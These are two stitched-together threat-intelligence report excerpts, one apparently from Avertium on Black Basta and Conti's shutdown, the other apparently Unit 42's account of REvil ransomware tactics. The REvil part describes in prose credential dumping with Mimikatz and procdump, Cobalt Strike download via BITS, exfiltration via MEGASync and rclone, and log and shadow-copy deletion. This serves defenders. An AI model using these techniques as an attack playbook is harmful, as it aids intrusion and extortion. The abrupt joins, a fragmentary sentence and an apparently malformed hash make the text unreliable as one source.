of stolen data. AdvIntel believes that\nConti can no longer support and obtain extortion and that the shutdown was not\nspontaneous but calculated. May 19, 2022 is Conti’s official date of death with their attack on\nCosta Rica being their final dance.\n\nThe attack on Costa Rica, which forced the country to declare a state of emergency, was\nConti’s way of keeping the illusion that they were still active and diverting everyone’s\nattention, while working on their restructuring. During the diversion tactics, Conti’s extension\n\n\n\n7/10\n\ngroups such as BlackByte and KaraKurt were actively and silently attacking organizations.\nAdditionally, infiltration specialists who were the backbone of Conti, were forming alliances\nwith BlackCat, AvosLocker, HIVE, and HelloKitty/FiveHands.\n\nThere is no evidence that suggests that Conti’s leaked chats have an impact on their recent\nactivities, but perhaps the event that provoked the leak (Conti’s support of Russia) in the first\nplace may have played a part in their demise. By engaging in political discourse, Conti\nintervened in Russian state matters, and opened themselves up for scrutiny and attacks from\nhacktivists like Anonymous and NB65.\n\ng shorter. This happened with Microsoft Exchange Server Vulnerabilities (CVE-2021-26855\nand CVE-2021-27065).\n\nStay Vigilant\n\nAs we stated in our previous Threat Intelligence Report featuring AvosLocker ransomware,\nransomware trends are on the rise and ambitious threat actors like Black Basta are in it for\nthe long haul. Black Basta’s recent attacks prove that they are not only consistent but\npersistent. Conti even addressed them in their blog when there was speculation surrounding\na connection to the gang. This acknowledgement could be an indicator of Black Basta’s\ntalent, as well as their gaining popularity. It’s important for organizations to remain vigilant in\nimplementing cyber security best practices and to keep a watchful eye on threat actors on\nthe rise.\n\nHow Avertium is Protecting Our CUSTOMERS \n\nSometimes anti-malware solutions just aren’t enough. Ransomware like Black Basta is a\ngreat risk to organizations, especially when they are persistent and attack critical industries\nlike healthcare and manufacturing. However, despite Black Basta’s success with attacking\nthese industries, Avertium had advanced services that can help your organization remain\nsafe and proactive:\n\nAvertium recommends utilizing our service for DFIR (Digital Forensics and Incident\nResponse) to help you rapidly assess, contain, eradicate, and recover from a security\nincident like a malware attack.\n\n\n\n\nhttps://www.avertium.com/resources/threat-reports/superbowl-weekend-blackbyte-coinbase-were-real-stars-of-show\nhttps://www.avertium.com/resources/threat-reports/blackcat-ransomware-triple-extortion-analysis-tactics\nhttps://www.avertium.com/resources/threat-reports/in-depth-look-at-avoslocker-ransomware\nhttps://www.avertium.com/resources/threat-reports/hive-ransomware-attacks-analysis\nhttps://www.avertium.com/blog/fivehands-ransomware-overview\nhttps://www.avertium.com/resources/threat-reports/russia-vs-ukraine-part-two\nhttps://www.avertium.com/blog/understanding-cybersecurity-best-practices\nhttps://www.avertium.com/threat-detection-response-xdr#dfir\n\n\n8/10\n\nImplement XDR as a prevention method. Our XDR is a combination of monitoring\nsoftware like LogRhythm, Microsoft Azure Sentinel, or AlienVault, combined with\nendpoint protection such as SentinelOne. XDR platforms enable cybersecurity through\na technology focus by collecting, correlating, and analyzing event data from any source\non the network. This includes endpoints, applications, network devices, and user\ninteractions.\n\n\n\n\nMDR provides an in-depth investigation into potential threats on an organization’s\nnetwork. Avertium’s risk-based approach to managed security delivers the right\ncombination of technology, field-validated threat intelligence, and resource\nempowerment to reduce complexity, streamline operations, and enhance cybersecurity\nresilience. If you need a more advanced security solution, MDR is the next step. MDR\nis an outsourced security control solution that includes the elements of EDR, enhanced\nwith a range of fundamental security processes.\n\n\n\nAvertium offers Zero Trust Architecture, like AppGate, to stop malware lateral\nmovement.\n\nAvertium’s Recommendations \n\nRegularly back up data, air gap, and password-protect backup copies offline. Ensure\ncopies of critical data are not accessible for modification or deletion from the system\nwhere the data resides.\n\n\n\n\nDLP (Data Loss Prevention) solutions should be implemented on all employee\nsystems.\n\n\n\n\nBlock URLS that may spread malware\n\n\n\n\nDon’t open untrusted links and email attachments without verifying their authenticity.\n\n\n\n\nUse strong passwords and multi-factor authentication.\n\n\n\n\nhttps://www.avertium.com/threat-detection-response-xdr\nhttps://www.avertium.com/threat-detection-response-xdr\nhttps://www.avertium.com/resources/webinars/trust-but-verify-isnt-enough-appgate\n\n\n9/10\n\nUse antivirus and internet security software on your devices.\n\n\n\n\nMonito the beacon networks to block data exfiltration malware or TAs.\n\n\n\nEducate employees on threats like phishing.\n\nMITRE Map\n\nIndicators of Compromise (IoCs)\n\n3f400f30415941348af21d515a2fc6a3bd0bf9c987288ca434221d7d81c54a47e913600a\n5d2204f3a20e163120f52a2e3595db19890050b2faa96c6cba6b094b0a52b0aa\n\n\n\n\nSUPPORTING DOCUMENTATION\n\nAdvIntel: Conti rebranding as several new ransomware groups (techtarget.com)\n\nNew Black Basta Ransomware Possibly Linked to Conti Group | SecurityWeek.Com\n\nHydra with Three Heads: BlackByte & The Future of Ransomware Subsidiary Groups\n(advintel.io)\n\nhttps://www.techtarget.com/searchsecurity/news/252520573/AdvIntel-Conti-rebranding-as-several-new-ransomware-groups\nhttps://www.securityweek.com/new-black-basta-ransomware-possibly-linked-conti-group\nhttps://www.advintel.io/post/hydra-with-three-heads-blackbyte-the-future-of-ransomware-subsidiary-groups\n\n\n10/10\n\nGerman wind farm operator confirms cybersecurity incident - The Record by Recorded\nFuture\n\nAmerican Dental Association hit by new Black Basta ransomware (bleepingcomputer.com)\n\nDisCONTInued: The End of Conti’s Brand Marks New Chapter For Cybercrime Landscape\n(advintel.io)\n\nNew Black Basta ransomware springs into action with a dozen breaches\n(bleepingcomputer.com)\n\nInside the Conti leaks rattling the cybercrime underground | README_\n\nUnderstanding Cybersecurity Best Practices (avertium.com)\n\nAmerican Dental Association confirms cyberattack after ransomware group claims credit -\nThe Record by Recorded Future\n\n https://krebsonsecurity.com/2022/03/conti-ransomware-group-diaries-part-i-evasion/\n\nNew Black Basta Ransomware Group - Cyberint\n\nCyble — Black Basta Ransomware\n\nExamining the Black Basta Ransomware’s Infection Routine (trendmicro.com)\n\nBeware of new Black Basta ransomware!

In just the\npast month, it extracted an $11 million payment from the U.S. subsidiary of the world’s\nlargest meatpacking company based in Brazil, demanded $5 million from a Brazilian medical\ndiagnostics company and launched a large-scale attack on dozens, perhaps hundreds, of\ncompanies that use IT management software from Kaseya VSA.\n\nhttps://unit42.paloaltonetworks.com/revil-threat-actors/\nhttps://unit42.paloaltonetworks.com/author/john-martineau/\nhttps://unit42.paloaltonetworks.com/category/ransomware/\nhttps://unit42.paloaltonetworks.com/category/unit-42/\nhttps://unit42.paloaltonetworks.com/tag/gandcrab/\nhttps://unit42.paloaltonetworks.com/tag/kaseya/\nhttps://unit42.paloaltonetworks.com/tag/ransomware-threat-report/\nhttps://unit42.paloaltonetworks.com/tag/revil/\nhttps://unit42.paloaltonetworks.com/tag/sodinokibi/\nhttps://unit42.paloaltonetworks.jp/revil-threat-actors/\n\n\n2/7\n\nWhile REvil (which is also known as Sodinokibi) may seem like a new player in the world of\ncybercrime, Unit 42 has been monitoring the threat actors tied to this group for three years.\nWe first encountered them in 2018 when they were working with a group known as\nGandCrab. At the time, they were mostly focused on distributing ransomware through\nmalvertising and exploit kits, which are malicious advertisements and malware tools that\nhackers use to infect victims through drive-by downloads when they visit a malicious website.\n\nThat group morphed into REvil, grew and earned a reputation for exfiltrating massive data\nsets and demanding multimillion dollar ransoms. It is now among an elite group of cyber\nextortion gangs that are responsible for the surge in debilitating attacks that have made\nransomware among the most pressing security threats to businesses and nations around the\nglobe.\n\nEarlier this year, we released a threat assessment tying REvil/Sodinokibi to GandCrab. Here,\nwe provide insights gleaned from Unit 42 cybersecurity consultants who worked over a\ndozen REvil ransomware cases in the first six months of 2021. We hope these accounts of\nREvil’s tactics and steps taken to counter this threat will help organizations better defend\nagainst future ransomware attacks. We also encourage you to review the 2021 Unit 42\nRansomware Threat Report for further insight into REvil and other ransomware operators.\n\nPalo Alto Networks WildFire, Threat Prevention and Cortex XDR detect and prevent REvil\nransomware infections.\n\nIf you think you may have been impacted, please email unit42-\ninvestigations@paloaltonetworks.com or call (866) 4-UNIT42 to get in touch with the Unit 42\nIncident Response team.\n\nRansomware as a Service\n\nREvil is one of the most prominent providers of ransomware as a service (RaaS). This\ncriminal group provides adaptable encryptors and decryptors, infrastructure and services for\nnegotiation communications, and a leak site for publishing stolen data when victims don’t pay\nthe ransom demand. For these services, REvil takes a percentage of the negotiated ransom\nprice as their fee. Affiliates of REvil often use two approaches to persuade victims into\npaying up: They encrypt data so that organizations cannot access information, use critical\ncomputer systems or restore from backups, and they also steal data and threaten to post it\non a leak site (a tactic known as double extortion).\n\nThreat actors behind REvil operations often stage and exfiltrate data followed by encryption\nof the environment as part of their double extortion scheme. If the victim organization does\nnot pay, REvil threat actors typically publish the exfiltrated information. We have observed\nthreat actors who are clients of REvil focus on attacking large organizations, which has\nenabled them to obtain increasingly large ransoms. REvil and its affiliates pulled in an\naverage payment of about $2.25 million during the first six months of 2021 in the cases that\n\nhttps://unit42.paloaltonetworks.com/ransomware-threat-assessments/7/\nhttps://start.paloaltonetworks.com/unit-42-ransomware-threat-report\nhttps://www.paloaltonetworks.com/products/secure-the-network/wildfire\nhttps://www.paloaltonetworks.com/products/secure-the-network/subscriptions/threat-prevention\nhttps://www.paloaltonetworks.com/cortex/cortex-xdr\nhttps://www.paloaltonetworks.com/resources/whitepapers/ransomwares-new-trend-exfiltration-and-extortion\n\n\n3/7\n\nwe observed. The size of specific ransoms depends on the size of the organization and type\nof data stolen. Further, when victims fail to meet deadlines for making payments via bitcoin,\nthe attackers often double the demand. Eventually, they post stolen data on the leak site if\nthe victim doesn’t pay up or enter into negotiations.\n\n2021 Trends – Something Old, Something New\n\nUnit 42 has worked over a dozen REvil ransomware cases so far this year. While some of\nthe tactics cited in our 2021 Unit 42 Ransomware Threat Report have remained the same,\nwe have seen a few deviations from REvil’s standard attack lifecycle. For a quick reference,\nwe have generated Actionable Threat Objects and Mitigations (ATOMs) to display REvil’s\ntactics, techniques, procedures and other indicators of compromise (IOCs).\n\nHow REvil Threat Actors Gain Access\n\nREvil threat actors continue to use previously compromised credentials to remotely access\nexternally facing assets through Remote Desktop Protocol (RDP). Another commonly\nobserved tactic is phishing leading to a secondary payload. However, we also observed a\nfew unique vectors that relate to the recent Microsoft Exchange Server CVEs, as well as a\ncase that involved a SonicWall compromise. Below are the five unique entry vectors\nobserved thus far in 2021.\n\nA user downloads a malicious email attachment that, when opened, initiates a payload\nthat downloads and installs a QakBot variant of malware. In at least one case, the\nversion of QakBot we observed collected emails stored on the local system, archived\nthem and exfiltrated them to an attacker controlled server.\nIn one instance, a malicious ZIP file attachment containing a macro-embedded Excel\nfile that led to an Ursnif infection was used to initially compromise the victim network.\nSeveral actors utilized compromised credentials to access internet-facing systems via\nRDP. It’s unclear how the actors gained access to the credentials in these instances.\nAn actor exploited a vulnerability in a client SonicWall appliance categorized as CVE-\n2021-20016 to gain access to credentials needed to access the environment.\nAn actor utilized the Exchange CVE-2021-27065 and CVE-2021-26855 vulnerabilities\nto gain access to an internet-facing Exchange server, which ultimately allowed the\nactor to create a local administrator account named “admin” that was added to the\n“Remote Desktop Users” group.\n\nHow REvil Threat Actors Establish Their Presence Within an Environment\n\nOnce access is obtained, REvil threat actors typically utilize Cobalt Strike BEACON to\nestablish their presence within an environment. In several instances we observed, they used\nthe remote connection software ScreenConnect and AnyDesk. In other cases, they chose to\ncreate their own local and domain accounts, which they added to the “Remote Desktop\n\nhttps://unit42.paloaltonetworks.com/ransomware-threat-report-highlights/\nhttps://unit42.paloaltonetworks.com/atoms/revil-ransomware/\nhttps://unit42.paloaltonetworks.com/microsoft-exchange-server-attack-timeline/\nhttps://unit42.paloaltonetworks.com/tutorial-qakbot-infection/\nhttps://unit42.paloaltonetworks.com/tag/ursnif/\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-20016\nhttps://unit42.paloaltonetworks.com/exchange-server-credential-harvesting/\n\n\n4/7\n\nUsers” group. Further, the threat actors often disabled antivirus, security services and\nprocesses that would interfere with or otherwise detect their presence within the\nenvironment.\n\nBelow are specific techniques we observed thus far in 2021:\n\nOnce the actor had access to the environment, they utilized different toolsets to\nestablish and maintain their access, including the use of Cobalt Strike BEACON as well\nas local and domain account creation. In one instance, the REvil group utilized a BITS\njob to connect to a remote IP, download and then execute a Cobalt Strike BEACON.\nIn several incidents, Unit 42 identified the use of “Total Deployment Software” by REvil\nthreat actors to deploy ScreenConnect and AnyDesk software to maintain access\nwithin the environment.\nIn many instances, the REvil actor(s) created local and domain level accounts through\nBEACON and NET commands even if they had access to domain-level administrative\ncredentials.\nUnit 42 observed common evasion techniques across all engagements in which REvil\nthreat actors used [1-3] alphanumeric batch and PowerShell scripts that stopped and\ndisabled antivirus products, services related to Exchange, VEAAM, SQL and EDR\nvendors, as well as enabled terminal server connections.\n\nHow REvil Threat Actors Expand Access and Gather Intelligence\n\nIn most cases, REvil actors need to gain access to additional accounts that have a wider set\nof privileges in order to move further within the victim environment and carry out their\nmission. They often use Mimikatz to access cached credentials on the local host. However,\nUnit 42 also observed the SysInternals tool procdump as a means to dump the LSASS\nprocess. Unit 42 also found it common for this threat actor to access files with the name\n“password” within the filename. In one instance, we observed an attempt to gain access to a\nKeePass Password Safe.\n\nDuring the reconnaissance phase of attacks, REvil threat actors often utilize various open\nsource tools to gather intelligence on a victim environment and in some cases resort to\nutilizing administrative commands NETSTAT and IPCONFIG to gather information.\n\nBelow are specific observations of REvil’s behavior in 2021.\n\nNetwork reconnaissance tools netscan, Advanced Port Scanner, TCP View and KPort\nScanner were observed in over half the engagements Unit 42 responded to.\nThe threat actors often use Bloodhound and AdFind to map out networks and gather\nother active directory information.\nIn two engagements, Unit 42 observed the use of ProcessHacker and PCHunter in\nwhat appeared to be an attempt to gain insight into processes and services running on\nhosts within the environment.\n\n\n\n5/7\n\nHow REvil Threat Actors Move Laterally Throughout Compromised\nEnvironments\n\nIn general, REvil threat actors utilize Cobalt Strike BEACON and RDP with previously\ncompromised credentials to laterally move throughout compromised environments.\nAdditionally, Unit 42 observed use of the ScreenConnect and AnyDesk software as methods\nof lateral movement. While we have seen other ransomware groups employ these tactics, we\nobserved REvil threat actors retrieving these binaries from file sharing sites such as\nMEGASync and PixelDrain.\n\nHow REvil Threat Actors Complete Their Objectives\n\nFinally, we observed REvil threat actors moving to the final stage of their attack, encrypting\nnetworks, staging and exfiltrating data, and destroying data to prevent recovery and hinder\nanalysis.\n\nRansomware Deployment\n\nREvil threat actors typically deployed ransomware encryptors using the legitimate\nadministrative tool PsExec with a text file list of computer names or IP addresses of the\nvictim network obtained during the reconnaissance phase.\nIn one instance, a REvil threat actor utilized BITS jobs to retrieve the ransomware from\ntheir infrastructure. In a separate instance, the REvil threat actor hosted their malware\non MEGASync.\nREvil threat actors also logged into hosts individually using domain accounts and\nexecuted the ransomware manually.\nIn two instances, the REvil threat actor utilized the program dontsleep.exe in order to\nkeep hosts on during ransomware deployment.\nREvil threat actors often encrypted the environment within seven days of the initial\ncompromise. However, in some instances, the threat actor(s) waited up to 23 days.\n\nExfil\n\nThreat actors often used MEGASync software or navigated to the MEGASync website\nto exfiltrate archived data.\nIn one instance, the threat actor used RCLONE to exfiltrate data.\n\nDefense Maneuvers\n\nDuring the encryption phase of these attacks, the REvil threat actors utilized batch scripts\nand wevtutil.exe to clear 103 different event logs. Additionally, while not an uncommon tactic\nthese days, REvil threat actors deleted Volume Shadow Copies in an apparent attempt to\nfurther prevent recovery of forensic evidence.\n\nConclusion: Evolve\n\nhttps://unit42.paloaltonetworks.com/ransomware-threat-assessments/3/\n\n\n6/7\n\nWhile the REvil operational group may target large organizations, all are potentially\nsusceptible to attack. As we draw closer to a post COVID-19 environment, IT and other\ndefenders of networks should take time to learn what’s normal in their environments and\nnotice and question abnormalities. Investigate them. Question your defenses. Do all users\nneed to be able to open macro-enabled documents? Do you have endpoint visibility and\nprotections to, at minimum, alert you to secondary infections such as QakBot? If you\nabsolutely need RDP, are you using tokenized MFA? And don’t question just once – question\nroutinely. Think like the attacker. You might be able to stop your organization from being the\nnext victim and escape being in the headlines for the wrong reasons.\n\nPalo Alto Networks customers are protected by:\n\nWildFire: All known samples are identified as malware.\nCortex XDR with:\n\nPrevention for known REvil indicators\nAnti-Ransomware Module to prevent REvil encryption behaviors.\nLocal Analysis detection to prevent REvil binary executions.\nBehavioral Threat Protection, Anti-exploitation modules and Suspicious Process\nCreation to prevent REvil techniques.\nXDR Analytics, Analytics BIOCs and BIOCs to detect REvil techniques.\n\nAutoFocus: Tracking related activity using the REvil tag.\nCortex XSOAR: “Kaseya VSA 0-day - REvil Ransomware Supply Chain Attack”\nplaybook.
